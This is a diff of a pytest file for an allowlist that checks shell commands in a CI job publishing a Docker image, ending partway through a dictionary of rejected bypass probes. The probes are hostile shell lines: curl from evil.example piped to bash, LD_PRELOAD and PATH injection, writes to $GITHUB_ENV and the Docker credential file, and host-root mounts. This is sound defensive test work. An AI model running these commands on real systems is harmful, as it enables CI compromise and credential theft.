-        for step in _jobs()["publish"]
-        if step.run is not None and step.shell != "python3 {0}"
-        for line in _logical_lines(step.run)
-    }
-
-
-@pytest.mark.parametrize("script", PRODUCTION_FORMS)
-def test_publish_command_allowlist_accepts_the_forms_in_use(script: str) -> None:
-    assert script in _production_lines()
-    assert _disallowed_commands(script) == []
-
-
-# SAF-44 round 2: bypasses found in the PR #17 review. Each passed the round-1
-# allowlist; each must keep failing it.
-@pytest.mark.parametrize(
-    "script",
-    [
-        # imagetools create must promote only the candidate, only to version/latest.
-        pytest.param(
-            "docker buildx imagetools create --tag ghcr.io/x/y:latest alpine",
-            id="imagetools-other-src",
-        ),
-        pytest.param(
-            f"docker buildx imagetools create --tag {LATEST_TAG} alpine {CANDIDATE_IMAGE}",
-            id="imagetools-multi-src",
-        ),
-        pytest.param(PROMOTE + "alpine", id="imagetools-create-alpine"),
-        pytest.param(
-            "docker buildx imagetools create --tag ghcr.io/evil/x:latest " + CANDIDATE_IMAGE,
-            id="imagetools-foreign-tag",
-        ),
-        pytest.param(
-            f"docker buildx imagetools create --tag={LATEST_TAG} {CANDIDATE_IMAGE}",
-            id="imagetools-tag-equals",
-        ),
-        pytest.param(PROMOTE + "--append " + CANDIDATE_IMAGE, id="imagetools-extra-option"),
-        pytest.param("docker buildx imagetools create " + CANDIDATE_IMAGE, id="imagetools-no-tag"),
-        pytest.param(
-            "docker buildx imagetools inspect alpine --format '{{json .Manifest.Digest}}'",
-            id="imagetools-inspect-other",
-        ),
-        pytest.param("docker manifest inspect alpine", id="manifest-inspect-other"),
-        # No environment prefixes, no assignments to other variables.
-        pytest.param("LD_PRELOAD=/tmp/x.so " + CANDIDATE_RUN + CANDIDATE_IMAGE, id="ld-preload"),
-        pytest.param("PATH=/evil docker pull " + CANDIDATE_IMAGE, id="path-inject"),
-        pytest.param("BASH_ENV=/tmp/evil docker pull " + CANDIDATE_IMAGE, id="bash-env"),
-        pytest.param("HEALTH=x docker pull " + CANDIDATE_IMAGE, id="allowed-name-as-prefix"),
-        pytest.param("PATH=/evil", id="path-assignment"),
-        pytest.param("SHELLOPTS=xtrace; docker logs ghidra-mcp-ci", id="shellopts-assignment"),
-        pytest.param("for PATH in /evil; do docker logs ghidra-mcp-ci; done", id="for-binds-path"),
-        # Redirections only to the targets the workflow uses.
-        pytest.param("printf 'pwned' > /tmp/evil", id="redir-write"),
-        pytest.param("echo pwned > /home/runner/.docker/config.json", id="redir-docker-config"),
-        pytest.param("echo pwned >> /home/runner/.docker/config.json", id="redir-append"),
-        pytest.param('echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"', id="redir-github-env"),
-        pytest.param('echo /evil >> "$GITHUB_PATH"', id="redir-github-path"),
-        pytest.param('echo x > "$GITHUB_OUTPUT"', id="redir-truncate-output"),
-        pytest.param("echo x &> /tmp/evil", id="redir-both-streams"),
-        pytest.param("echo x 2> /tmp/evil", id="redir-stderr-file"),
-        pytest.param("echo x <<EOF", id="redir-heredoc"),
-        # Low items from the review, closed while here.
-        pytest.param(
-            CANDIDATE_RUN + "-e GHIDRA_MCP_PUBLIC_URL=http://evil.example/ " + CANDIDATE_IMAGE,
-            id="env-evil-url",
-        ),
-        pytest.param(
-            "docker run -d -e GHIDRA_MCP_AUTH_TOKEN=known " + CANDIDATE_IMAGE,
-            id="env-fixed-token",
-        ),
-        pytest.param("docker logs anything-at-all", id="logs-other"),
-        pytest.param("docker rm -f anything", id="rm-other"),
-    ],
-)
-def test_publish_command_allowlist_rejects_review_r2_gaps(script: str) -> None:
-    assert _disallowed_commands(script)
-
-
-# SAF-44 round 3: bypasses found in the second PR #17 review, plus siblings of
-# the same classes (assignment without `NAME=`, commands hidden in an allowed
-# command). Each passed the round-2 allowlist. The expected reason is asserted
-# so that dropping a check fails its case even when another check also fires.
-@pytest.mark.parametrize(
-    ("script", "reason"),
-    [
-        # Unknown redirection operators, including writes to $GITHUB_ENV.
-        pytest.param(
-            'echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"',
-            "shell operator '&>>'",
-            id="andappend-github-env",
-        ),
-        pytest.param("echo pwned &>>/tmp/evil", "shell operator '&>>'", id="redir-andappend"),
-        pytest.param(
-            "echo pwned 1<>/home/runner/.docker/config.json",
-            "shell operator '<>'",
-            id="redir-rw",
-        ),
-        pytest.param("echo pwned <>/tmp/evil", "shell operator '<>'", id="redir-rw-nofd"),
-        pytest.param(
-            'echo "PATH=/evil" 1<> "$GITHUB_ENV"', "shell operator '<>'", id="rw-github-env"
-        ),
-        pytest.param('echo x >>& "$GITHUB_ENV"', "shell operator '>>&'", id="appendamp-github-env"),
-        pytest.param("echo $((PATH=5))", "shell operator '(('", id="arith-assign"),
-        pytest.param(
-            "echo 'x>/tmp/evil'", "'<' or '>' inside the word", id="quoted-angle-bracket-word"
-        ),
-        # printf only in the workflow's form: printf -v assigns any variable.
-        pytest.param("printf -v PATH '%s' /tmp/evil", "printf other than", id="printf-v-PATH"),
-        pytest.param(
-            "printf -v IMAGE_NAME '%s' ghcr.io/evil/x", "printf other than", id="printf-v-IMAGE"
-        ),
-        pytest.param(
-            "printf -v BASH_ENV '%s' /tmp/evil", "printf other than", id="printf-v-BASH_ENV"
-        ),
-        pytest.param(
-            'printf \'%s\\n\' "$INSPECT_ERROR" "$TOKEN"', "printf other than", id="printf-extra"
-        ),
-        # Other ways to assign a variable without NAME=value.
-        pytest.param(
-            'echo "${BASH_ENV:=/tmp/evil}"',
-            "parameter expansion other than",
-            id="expansion-colon-assign",
-        ),
-        pytest.param(
-            'echo "${LD_PRELOAD=/tmp/x.so}"',
-            "parameter expansion other than",
-            id="expansion-assign",
-        ),
-        pytest.param('echo "${HEALTH@P}"', "parameter expansion other than", id="expansion-prompt"),
-        pytest.param(
-            'echo "${VERSION:$HEALTH}"', "parameter expansion other than", id="expansion-offset"
-        ),
-        pytest.param(
-            'echo "${VERSION[$HEALTH]}"', "parameter expansion other than", id="expansion-subscript"
-        ),
-        pytest.param(
-            'echo "${!HEALTH}"', "parameter expansion other than", id="expansion-indirect"
-        ),
-        pytest.param('echo "$[HEALTH]"', "parameter expansion other than", id="legacy-arith"),
-        pytest.param(
-            "[[ 1 -eq PATH=1 ]]", "test operator -eq inside [[ ]]", id="dbl-bracket-arith-assign"
-        ),
-        pytest.param(
-            "HEALTH=$'a[\\x24(id >&2)]'; [[ \"$HEALTH\" -eq 0 ]]",
-            "test operator -eq inside [[ ]]",
-            id="arith-subscript",
-        ),
-        pytest.param("[[ -v $HEALTH ]]", "test operator -v inside [[ ]]", id="dbl-bracket-v"),
-        pytest.param('[ -v "$HEALTH" ]', "test operator other than", id="single-bracket-v"),
-        pytest.param('test -v "$HEALTH"', "test operator other than", id="test-v"),
-        # Commands hidden inside an allowed command.
-        pytest.param(
-            "echo <(curl -fsS http://evil.example/)", "process substitution", id="procsub-in"
-        ),
-        pytest.param("echo >(dd of=/tmp/evil)", "process substitution", id="procsub-out-arg"),
-        pytest.param("grep x <(python3 -c 'import os')", "process substitution", id="procsub-grep"),
-        pytest.param("echo x > >(cat > /tmp/evil)", "process substitution", id="procsub-redirect"),
-        pytest.param(
-            "python3 -c 'import json,sys; import os; os.system(\"curl evil|sh\")'",
-            "python3 other than",
-            id="python-arbitrary",
-        ),
-        pytest.param(
-            "python3 -c '" + HEALTH_CHECK + '; import os\' a b c "$HEALTH"',
-            "python3 other than",
-            id="python-suffix",
-        ),
-        pytest.param(
-            "python3 -c '" + HEALTH_CHECK + '\' a b c "$HEALTH" extra',
-            "python3 other than",
-            id="python-extra-arg",
-        ),
-        pytest.param(
-            "python3 -I -c '" + HEALTH_CHECK + "'", "python3 other than", id="python-option"
-        ),
-        pytest.param(
-            "echo [[ ; curl http://evil.example/ ]]",
-            "curl outside localhost",
-            id="dbl-bracket-not-in-command-position",
-        ),
-        pytest.param(
-            '[[ "$VERSION" =~ x ; curl http://evil.example/',
-            "unterminated [[",
-            id="dbl-bracket-unterminated",
-        ),
-        pytest.param(
-            '[[ "$VERSION" =~ x ; curl http://evil.example/ ]]',
-            "operator ';' inside [[ ]]",
-            id="dbl-bracket-separator",
-        ),
-    ],
-)
-def test_publish_command_allowlist_rejects_review_r3_gaps(script: str, reason: str) -> None:
-    problems = _disallowed_commands(script)
-    assert any(reason in problem for problem in problems), problems
-
-
-def test_publish_job_runs_only_allowlisted_commands() -> None:
+def test_publish_job_steps_use_only_pinned_actions() -> None:
     steps = _jobs()["publish"]
 
     assert steps[0].uses is not None and steps[0].uses.startswith("actions/checkout@")
@@ -1173,17 +814,627 @@ def test_publish_job_runs_only_allowlisted_commands() -> None:
             assert step.run is None
             continue
         assert step.run is not None, step.name
-        if step.name == VERSION_CHECK:
-            assert step.shell == "python3 {0}"
-            continue
-        assert step.shell in (None, "bash"), step.name
-        assert _disallowed_commands(step.run) == [], step.name
-        for command in _commands(step.run):
-            assert "|| true" not in command or command in {
-                'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
-                "docker rm -f ghidra-mcp-ci 2>/dev/null || true",
-            }, (step.name, command)
     assert [step.name for step in steps if step.shell == "python3 {0}"] == [VERSION_CHECK]
+
+
+HEALTH_CHECK = (
+    "import json,sys; data=json.loads(sys.argv[4]); assert data == "
+    '{"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], '
+    '"schema_version": sys.argv[3]}'
+)
+CANDIDATE_RUN = (
+    'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" '
+)
+VERSION_TAG = '"${IMAGE_NAME}:${{ steps.version.outputs.value }}"'
+LATEST_TAG = '"${IMAGE_NAME}:latest"'
+PROMOTE = f"docker buildx imagetools create --tag {VERSION_TAG} --tag {LATEST_TAG} "
+
+# Every probe from the PR #15 / PR #17 reviews (r1: saf-44-r2/probes.py; r2:
+# probes_r2.py; r3: probes_r3.py and key_probes.py) and every SAF-44 in-test
+# counterexample, deduplicated by value. Under the old shlex-based checker these
+# were rejected one bypass class at a time; under exact matching none of them
+# needs a dedicated rule. Probes that are verbatim production lines are accepted
+# (see test_publish_line_allowlist_accepts_verbatim_production_probes); every
+# other probe, including semantically equivalent rewrites of a production line
+# (`printf "%s\n"`, reordered `-e` options, ...), is rejected by design.
+REVIEW_PROBES: dict[str, str] = {
+    "r1-ld-preload": "LD_PRELOAD=/tmp/x.so " + CANDIDATE_RUN + CANDIDATE_IMAGE,
+    "r1-path-inject": "PATH=/evil docker pull " + CANDIDATE_IMAGE,
+    "r1-bash-env": "BASH_ENV=/tmp/evil docker pull " + CANDIDATE_IMAGE,
+    "r1-redir-write": "printf 'pwned' > /tmp/evil",
+    "r1-redir-docker-config": "echo pwned > /home/runner/.docker/config.json",
+    "r1-imagetools-other-src": "docker buildx imagetools create --tag ghcr.io/x/y:latest alpine",
+    "r1-imagetools-multi-src": 'docker buildx imagetools create --tag "${IMAGE_NAME}:latest" alpine '
+    + CANDIDATE_IMAGE,
+    "r1-env-evil-url": CANDIDATE_RUN
+    + "-e GHIDRA_MCP_PUBLIC_URL=http://evil.example/ "
+    + CANDIDATE_IMAGE,
+    "r1-logs-other": "docker logs anything-at-all",
+    "r1-rm-other": "docker rm -f anything",
+    "r1-curl-userinfo": "curl -fsS http://127.0.0.1:8765@example.invalid/",
+    "r1-buildx-push": "docker buildx build --push -t x .",
+    "r1-run-workflow-shape": CANDIDATE_RUN
+    + "-e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 "
+    + CANDIDATE_IMAGE,
+    "r2-create-src-before-tag": f"docker buildx imagetools create {CANDIDATE_IMAGE} --tag {LATEST_TAG}",
+    "r2-create-dup-candidate": f"docker buildx imagetools create --tag {LATEST_TAG} {CANDIDATE_IMAGE} {CANDIDATE_IMAGE}",
+    "r2-create-tag-t": f"docker buildx imagetools create -t {LATEST_TAG} {CANDIDATE_IMAGE}",
+    "r2-create-tag-noquote-other": f"docker buildx imagetools create --tag ${{IMAGE_NAME}}:latest2 {CANDIDATE_IMAGE}",
+    "r2-create-tag-dangling": f"docker buildx imagetools create {CANDIDATE_IMAGE} --tag",
+    "r2-create-tag-eq-other": f"docker buildx imagetools create --tag {LATEST_TAG} --tag=evil {CANDIDATE_IMAGE}",
+    "r2-create-src-tagword": f"docker buildx imagetools create --tag {LATEST_TAG} {VERSION_TAG}",
+    "r2-create-src-subst": f'docker buildx imagetools create --tag {LATEST_TAG} "$(echo alpine)"',
+    "r2-create-src-var": f'docker buildx imagetools create --tag {LATEST_TAG} "$HEALTH"',
+    "r2-create-builder": f"docker buildx --builder x imagetools create --tag {LATEST_TAG} {CANDIDATE_IMAGE}",
+    "r2-create-dashdash": f"docker buildx imagetools create --tag {LATEST_TAG} -- {CANDIDATE_IMAGE}",
+    "r2-create-file": f"docker buildx imagetools create --tag {LATEST_TAG} -f /tmp/x {CANDIDATE_IMAGE}",
+    "r2-inspect-extra": f"docker buildx imagetools inspect {VERSION_TAG} --format '{{{{json .Manifest.Digest}}}}' --raw",
+    "r2-inspect-latest": f"docker buildx imagetools inspect {LATEST_TAG} --format '{{{{json .Manifest.Digest}}}}'",
+    "r2-manifest-inspect-latest": f"docker manifest inspect {LATEST_TAG}",
+    "r2-docker-global-opt": f"docker --config /tmp/c buildx imagetools create --tag {LATEST_TAG} {CANDIDATE_IMAGE}",
+    "r2-docker-H": f"docker -H tcp://evil pull {CANDIDATE_IMAGE}",
+    "r2-export-path": "export PATH=/evil",
+    "r2-env-cmd": "env LD_PRELOAD=/tmp/x docker pull " + CANDIDATE_IMAGE,
+    "r2-declare": "declare -x PATH=/evil",
+    "r2-assign-image-name": "IMAGE_NAME=ghcr.io/evil/x",
+    "r2-assign-two-prefix": "VERSION=1 TOKEN=2 docker pull " + CANDIDATE_IMAGE,
+    "r2-assign-then-semicolon-cmd": "HEALTH=x; docker pull " + CANDIDATE_IMAGE,
+    "r2-assign-in-subst": 'HEALTH="$(PATH=/evil docker logs ghidra-mcp-ci)"',
+    "r2-assign-after-bang": "! PATH=/evil docker pull " + CANDIDATE_IMAGE,
+    "r2-printf-v-PATH": "printf -v PATH '%s' /tmp/evil",
+    "r2-printf-v-IMAGE": "printf -v IMAGE_NAME '%s' ghcr.io/evil/x",
+    "r2-printf-v-LDPRELOAD": "printf -v BASH_ENV '%s' /tmp/evil",
+    "r2-array-assign": "PATH[0]=/evil",
+    "r2-for-other-var": "for PATH in /evil; do true; done",
+    "r2-for-underscore-ok": "for _ in $(seq 1 3); do sleep 1; done",
+    "r2-redir-rw": "echo pwned 1<>/home/runner/.docker/config.json",
+    "r2-redir-rw-nofd": "echo pwned <>/tmp/evil",
+    "r2-redir-andappend": "echo pwned &>>/tmp/evil",
+    "r2-redir-gt-amp-file": "echo pwned >&/tmp/evil",
+    "r2-redir-fd3": "echo pwned 3>/tmp/evil",
+    "r2-redir-noclobber": "echo pwned >|/tmp/evil",
+    "r2-redir-output-word-split": 'echo x >>"$GITHUB_OUTPUT"x',
+    "r2-redir-dup-fd-arg": "echo 2 > /dev/null",
+    "r2-redir-output-arbitrary": 'echo "digest=sha256:evil" >> "$GITHUB_OUTPUT"',
+    "r2-redir-procsub-out": "echo x > >(cat > /tmp/evil)",
+    "r2-procsub-in": "echo <(curl -fsS http://evil.example/)",
+    "r2-procsub-out-arg": "echo >(dd of=/tmp/evil)",
+    "r2-procsub-grep": "grep x <(python3 -c 'import os')",
+    "r2-tee-allowed?": "echo x | tee /tmp/evil",
+    "r2-python-arbitrary": "python3 -c 'import json,sys; import os; os.system(\"curl evil|sh\")'",
+    "r2-openssl-out": "openssl rand -out /home/runner/.docker/config.json 16",
+    "r2-openssl-engine": "openssl rand -engine /tmp/evil.so 16",
+    "r2-grep-docker-config": "grep -r . /home/runner/.docker/config.json",
+    "r2-arith-subscript": "HEALTH=$'a[\\x24(id >&2)]'; [[ \"$HEALTH\" -eq 0 ]]",
+    "r2-arith-dollar-paren": "echo $(( $(id) ))",
+    "r2-brace-param-subst": 'echo "${HEALTH:-$(curl -fsS http://evil.example/)}"',
+    "r2-test-in-dbl-bracket-sep": "[[ -n x ]] || curl http://evil.example/",
+    "r2-dbl-bracket-unterminated": "[[ -n x ; curl http://evil.example/",
+    "r2-eval": "eval 'curl evil'",
+    "r2-source": ". /tmp/evil",
+    "r2-trap": "trap 'curl evil' EXIT",
+    "r2-exec-redir": "exec 3>/tmp/evil",
+    "r2-case-stmt": "case x in x) curl http://evil.example/ ;; esac",
+    "r2-function-def": "f() { curl http://evil.example/; }",
+    "r3-p1-andappend-env": 'echo "LD_PRELOAD=/tmp/x.so" &>> "$GITHUB_ENV"',
+    "r3-p1-rw": "echo x <> /tmp/evil",
+    "r3-p1-1rw-env": 'echo PATH=/evil 1<> "$GITHUB_ENV"',
+    "r3-p1-appendamp": 'echo x >>& "$GITHUB_ENV"',
+    "r3-p1-gt-env": 'echo x > "$GITHUB_ENV"',
+    "r3-p1-append-env": 'echo x >> "$GITHUB_ENV"',
+    "r3-p1-append-path": 'echo /evil >> "$GITHUB_PATH"',
+    "r3-p1-amp-gt-env": 'echo x &> "$GITHUB_ENV"',
+    "r3-p1-clobber-env": 'echo x >| "$GITHUB_ENV"',
+    "r3-p1-dupout-env": 'echo x >& "$GITHUB_ENV"',
+    "r3-p1-fd3-env": 'echo x 3>> "$GITHUB_ENV"',
+    "r3-p1-lt-amp": "echo x <& 3",
+    "r3-p1-fdvar": 'echo x {fd}>> "$GITHUB_ENV"',
+    "r3-p1-fdvar2": 'echo x {fd}>>"$GITHUB_ENV"',
+    "r3-p1-nospace": 'echo x>>"$GITHUB_ENV"',
+    "r3-p1-heredoc": "cat <<EOF",
+    "r3-p1-heredoc-dash": "echo <<-EOF",
+    "r3-p1-append-out-other": 'echo x >> "$GITHUB_OUTPUT_X"',
+    "r3-p1-append-out-unquoted": "echo x >> $GITHUB_OUTPUT",
+    "r3-p1-quoted-env-target": "echo x >> '$GITHUB_ENV'",
+    "r3-p1-escaped-gt": "echo x \\>\\> /tmp/evil",
+    "r3-p2-printf-v2": "printf -vPATH '%s' /tmp/evil",
+    "r3-p2-printf-b": "printf '%b' \"$INSPECT_ERROR\"",
+    "r3-p2-printf-prod": "printf '%s\\n' \"$INSPECT_ERROR\" >&2",
+    "r3-p2-printf-dq": 'printf "%s\\n" "$INSPECT_ERROR" >&2',
+    "r3-p2-printf-unq-arg": "printf '%s\\n' $INSPECT_ERROR",
+    "r3-p3-in": "echo <(id)",
+    "r3-p3-out": "echo >(id)",
+    "r3-p3-quoted": "echo '<(id)'",
+    "r3-p3-redir": "echo x > >(id)",
+    "r3-p3-grep": "grep x < <(id)",
+    "r3-p4-prefix-suffix": "python3 -c 'import json,sys; import os; os.system(\"id\")'",
+    "r3-p4-prod-plus-suffix": "python3 -c '"
+    + HEALTH_CHECK
+    + '; import os\' "${{ steps.version.outputs.value }}" "${{ github.sha }}" "${{ steps.version.outputs.schema }}" "$HEALTH"',
+    "r3-p4-prod": "python3 -c '"
+    + HEALTH_CHECK
+    + '\' "${{ steps.version.outputs.value }}" "${{ github.sha }}" "${{ steps.version.outputs.schema }}" "$HEALTH"',
+    "r3-p4-env-pythonpath": "PYTHONSTARTUP=/x python3 -c '" + HEALTH_CHECK + "' a b c d",
+    "r3-c-arith-unq": "echo $((PATH=5))",
+    "r3-c-dblbr-arith": "[[ 1 -eq PATH=1 ]]",
+    "r3-c-colon-assign": 'echo "${X:=v}"',
+    "r3-c-at-p": 'echo "${H@P}"',
+    "r3-c-legacy": 'echo "$[1+1]"',
+    "r3-c-echo-dblbr": "echo [[ ; curl http://evil.example/ ]]",
+    "r3-n-arith-dq-assign-PATH": 'echo "$((PATH=5))"',
+    "r3-n-arith-dq-HEALTH": 'echo "$((HEALTH))"',
+    "r3-n-arith-dq-in-assign": 'VERSION="$((HEALTH))"',
+    "r3-n-arith-sq-build-then-dq": "HEALTH='x[$''(id >&2)]'; echo \"$((HEALTH))\"",
+    "r3-n-arith-ansic-then-dq": "HEALTH=$'x[\\x24(id)]'; echo \"$((HEALTH))\"",
+    "r3-n-arith-dq-exit": 'exit "$((HEALTH))"',
+    "r3-n-arith-dq-sleep": 'sleep "$((HEALTH))"',
+    "r3-n-arith-dq-dblbr": '[[ "$((HEALTH))" ]]',
+    "r3-n-arith-dq-nested-cmd": 'echo "$((x[$(id)]))"',
+    "r3-n-var-cmdname": '"$HEALTH"',
+    "r3-n-eval": "eval id",
+    "r3-n-source": "source /tmp/x",
+    "r3-n-dot": ". /tmp/x",
+    "r3-n-env": "env id",
+    "r3-n-command": "command id",
+    "r3-n-builtin": "builtin eval id",
+    "r3-n-exec": "exec id",
+    "r3-n-coproc": "coproc id",
+    "r3-n-declare-n": "declare -n X=PATH",
+    "r3-n-typeset": "typeset PATH=/evil",
+    "r3-n-mapfile": "mapfile PATH",
+    "r3-n-read": "read PATH",
+    "r3-n-local": "local PATH=/evil",
+    "r3-n-alias": "alias echo=id",
+    "r3-n-trap": "trap id EXIT",
+    "r3-n-set": "set -o xtrace",
+    "r3-n-echo-e": "echo -e 'x\\ny'",
+    "r3-n-time": "time id",
+    "r3-n-keyword-time-dblbr": "time [[ 1 -eq PATH=1 ]]",
+    "r3-n-array-after-allowed": "VERSION=1 PATH[0]=/evil",
+    "r3-n-assign-ansic-cmdname": "$'\\x63url' http://evil.example/",
+    "r3-n-tilde-assign": "HEALTH=~root",
+    "r3-n-glob-cmd": "/usr/bin/cur? http://evil.example",
+    "r3-n-workflow-cmd": 'echo "::add-path::/tmp/evil"',
+    "r3-n-github-expr-any": 'echo "${{ github.event.head_commit.message }}"',
+    "r3-n-comment-hide": "echo x #; curl http://evil.example/",
+    "r3-n-midword-hash": "echo x#; curl http://evil.example/",
+    "r3-n-brace-group": "{ curl http://evil.example/; }",
+    "r3-n-subshell": "( curl http://evil.example/ )",
+    "r3-n-pipe-amp": "echo x |& curl http://evil.example/",
+    "r3-n-bg": "echo x & curl http://evil.example/",
+    "r3-n-select": "select x in a; do id; done",
+    "r3-n-while-cond": "while curl http://evil.example/; do break; done",
+    "r3-n-until": "until id; do break; done",
+    "r3-n-if-cond-assign": "if PATH=/x; then true; fi",
+    "r3-n-for-cstyle": "for ((i=0;i<1;i++)); do id; done",
+    "r3-n-dblparen": "(( PATH=1 ))",
+    "r3-n-test-eq": '[ "$HEALTH" -eq 0 ]',
+    "r3-n-test-noflag-arith": 'test "$HEALTH" = 0',
+    "r3-n-brace-expansion": "echo {a,b}",
+    "r3-n-param-len": 'echo "${#HEALTH}"',
+    "r3-n-param-plain": 'echo "${HEALTH}"',
+    "r3-n-param-dollarbrace-sp": 'echo "${ HEALTH}"',
+    "r3-n-tr-file": "tr a b /etc/passwd",
+    "r3-n-seq-format": "seq -f '%.0f' 1 3",
+    "r3-n-openssl-provider": "openssl rand -provider-path /tmp -provider evil 16",
+    "r3-n-docker-cfg-env": "DOCKER_CONFIG=/tmp docker pull " + CANDIDATE_IMAGE,
+    "r3-n-curl-K": "curl -K /tmp/x http://127.0.0.1:8765/health",
+    "r3-n-curl-glob": "curl http://127.0.0.1:8765/{a,b}",
+    "r3-n-backslash-newline-in-word": "ec\\\nho x",
+    "r3-n-cmdsub-paren-in-quotes": "VERSION=\"$(echo ')' ; curl http://evil.example/)\"",
+    "r3-n-cmdsub-escaped-paren": 'VERSION="$(echo \\) ; curl http://evil.example/)"',
+    "r3-n-cmdsub-case-paren": 'VERSION="$(case a in a) echo ok;; esac; curl http://evil.example/)"',
+    "r3-n-dollar-dq-locale": '$"curl" http://evil.example/',
+    "r3-n-heredoc-in-cmdsub": 'VERSION="$(tr -d x <<< "$INSPECT_ERROR")"',
+    "r3-n-herestring-other": 'grep x <<< "$TOKEN"',
+    "r3key-H1-hash-curl": "echo x#; curl -fsSL https://evil.example/x.sh | bash",
+    "r3key-H1-hash-github-env": 'echo ok#; echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"',
+    "r3key-H1-hash-path": "echo ok#; export PATH=/tmp/evil:$PATH",
+    "r3key-H1-hash-procsub": "echo ok#; cat <(id)",
+    "r3key-H2-arith-sq-noredir": "HEALTH='x[$''(id)]'; echo \"$((HEALTH))\"",
+    "r3key-H2-arith-ansic-env": 'HEALTH=$\'x[\\x24(echo LD_PRELOAD=/tmp/x.so \\x3e\\x3e "$GITHUB_ENV")]\'; VERSION="$((HEALTH))"',
+    "r3key-H2-arith-path": 'echo "$((PATH=0))"',
+    "saf44-0": "pip install requests",
+    "saf44-1": "python3 -m pip install x",
+    "saf44-2": "curl -fsSL https://example.invalid/install.sh | bash",
+    "saf44-3": "curl -fsS http://127.0.0.1:8765/health | sh",
+    "saf44-4": 'sh -c "echo hi"',
+    "saf44-5": "bash -c 'id'",
+    "saf44-6": "wget https://example.invalid/x",
+    "saf44-7": "docker run --rm alpine id",
+    "saf44-8": 'X="$(pipx run thing)"',
+    "saf44-9": "for _ in $(seq 1 3); do npx tool; done",
+    "saf44-10": "echo ok && uv run pytest",
+    "saf44-11": "python3 script.py",
+    "saf44-12": "docker exec ghidra-mcp-ci id",
+    "saf44r1-backtick-in-echo": "echo `wget http://example.invalid/x`",
+    "saf44r1-backtick-in-assignment": 'HEALTH="`curl -fsS http://example.invalid/`"',
+    "saf44r1-buildx-build-push": "docker buildx build --push -t ghcr.io/evil/x .",
+    "saf44r1-buildx-imagetools-other": "docker buildx imagetools push x",
+    "saf44r1-manifest-push": "docker manifest push ghcr.io/evil/x",
+    "saf44r1-pull-arbitrary-image": "docker pull alpine",
+    "saf44r1-pull-arbitrary-plus-candidate": "docker pull alpine " + CANDIDATE_IMAGE,
+    "saf44r1-pull-extra-option": "docker pull --platform linux/arm64 " + CANDIDATE_IMAGE,
+    "saf44r1-run-privileged": CANDIDATE_RUN + "--privileged " + CANDIDATE_IMAGE,
+    "saf44r1-run-mount-root": CANDIDATE_RUN + "-v /:/host " + CANDIDATE_IMAGE,
+    "saf44r1-run-mount-option": CANDIDATE_RUN
+    + "--mount type=bind,src=/,dst=/host "
+    + CANDIDATE_IMAGE,
+    "saf44r1-run-entrypoint": CANDIDATE_RUN + "--entrypoint /bin/sh " + CANDIDATE_IMAGE,
+    "saf44r1-run-bundled-short-flags": "docker run -dv /:/host " + CANDIDATE_IMAGE,
+    "saf44r1-run-other-network": "docker run -d --network container:x " + CANDIDATE_IMAGE,
+    "saf44r1-run-foreign-env": "docker run -d -e LD_PRELOAD=/x.so " + CANDIDATE_IMAGE,
+    "saf44r1-run-trailing-argv": "docker run -d " + CANDIDATE_IMAGE + " id",
+    "saf44r1-curl-L": "curl -L http://127.0.0.1:8765/health",
+    "saf44r1-curl-fsSL": "curl -fsSL http://127.0.0.1:8765/health",
+    "saf44r1-curl-location": "curl --location http://127.0.0.1:8765/health",
+    "saf44r1-curl-output-file": "curl -fsS -o /tmp/x http://127.0.0.1:8765/health",
+    "saf44r2-imagetools-create-alpine": PROMOTE + "alpine",
+    "saf44r2-imagetools-foreign-tag": "docker buildx imagetools create --tag ghcr.io/evil/x:latest "
+    + CANDIDATE_IMAGE,
+    "saf44r2-imagetools-tag-equals": f"docker buildx imagetools create --tag={LATEST_TAG} {CANDIDATE_IMAGE}",
+    "saf44r2-imagetools-extra-option": PROMOTE + "--append " + CANDIDATE_IMAGE,
+    "saf44r2-imagetools-no-tag": "docker buildx imagetools create " + CANDIDATE_IMAGE,
+    "saf44r2-imagetools-inspect-other": "docker buildx imagetools inspect alpine --format '{{json .Manifest.Digest}}'",
+    "saf44r2-manifest-inspect-other": "docker manifest inspect alpine",
+    "saf44r2-allowed-name-as-prefix": "HEALTH=x docker pull " + CANDIDATE_IMAGE,
+    "saf44r2-path-assignment": "PATH=/evil",
+    "saf44r2-shellopts-assignment": "SHELLOPTS=xtrace; docker logs ghidra-mcp-ci",
+    "saf44r2-for-binds-path": "for PATH in /evil; do docker logs ghidra-mcp-ci; done",
+    "saf44r2-redir-append": "echo pwned >> /home/runner/.docker/config.json",
+    "saf44r2-redir-github-env": 'echo "LD_PRELOAD=/tmp/x.so" >> "$GITHUB_ENV"',
+    "saf44r2-redir-truncate-output": 'echo x > "$GITHUB_OUTPUT"',
+    "saf44r2-redir-both-streams": "echo x &> /tmp/evil",
+    "saf44r2-redir-stderr-file": "echo x 2> /tmp/evil",
+    "saf44r2-redir-heredoc": "echo x <<EOF",
+    "saf44r2-env-fixed-token": "docker run -d -e GHIDRA_MCP_AUTH_TOKEN=known " + CANDIDATE_IMAGE,
+    "saf44r3-rw-github-env": 'echo "PATH=/evil" 1<> "$GITHUB_ENV"',
+    "saf44r3-quoted-angle-bracket-word": "echo 'x>/tmp/evil'",
+    "saf44r3-printf-extra": 'printf \'%s\\n\' "$INSPECT_ERROR" "$TOKEN"',
+    "saf44r3-expansion-colon-assign": 'echo "${BASH_ENV:=/tmp/evil}"',
+    "saf44r3-expansion-assign": 'echo "${LD_PRELOAD=/tmp/x.so}"',
+    "saf44r3-expansion-prompt": 'echo "${HEALTH@P}"',
+    "saf44r3-expansion-offset": 'echo "${VERSION:$HEALTH}"',
+    "saf44r3-expansion-subscript": 'echo "${VERSION[$HEALTH]}"',
+    "saf44r3-expansion-indirect": 'echo "${!HEALTH}"',
+    "saf44r3-legacy-arith": 'echo "$[HEALTH]"',
+    "saf44r3-dbl-bracket-v": "[[ -v $HEALTH ]]",
+    "saf44r3-single-bracket-v": '[ -v "$HEALTH" ]',
+    "saf44r3-test-v": 'test -v "$HEALTH"',
+    "saf44r3-python-suffix": "python3 -c '" + HEALTH_CHECK + '; import os\' a b c "$HEALTH"',
+    "saf44r3-python-extra-arg": "python3 -c '" + HEALTH_CHECK + '\' a b c "$HEALTH" extra',
